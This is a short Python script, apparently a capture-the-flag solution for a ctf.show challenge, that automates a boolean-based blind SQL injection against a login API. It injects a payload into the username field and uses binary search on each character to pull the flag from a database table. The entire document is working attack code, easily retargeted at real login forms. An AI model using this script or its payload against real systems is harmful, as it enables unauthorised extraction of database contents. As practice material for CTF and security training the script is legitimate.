import requests
url = 'http://e9bd512d-7b94-43eb-97e0-6ccd5bb8fb87.challenge.ctf.show/api/'
flag = ''
for i in range(100):
    lenth = len(flag)
    min = 32
    max = 128
    while True:
        j = min + (max-min)//2
        if(min == j):
            flag += chr(j)
            print(flag)
            if(len(flag) > 2 and chr(j) == ' '):
                exit()
            break
        payload=f"' or if(ord(substr((select group_concat(f1ag) from ctfshow_fl0g),{i},1))<{j},1,0)-- -"

        data = {'username':payload
                ,'password':114514}
        r = requests.post(url=url,data=data).text
        if(r'\u5bc6\u7801\u9519\u8bef' in r):
            max = j
        else:
            min = j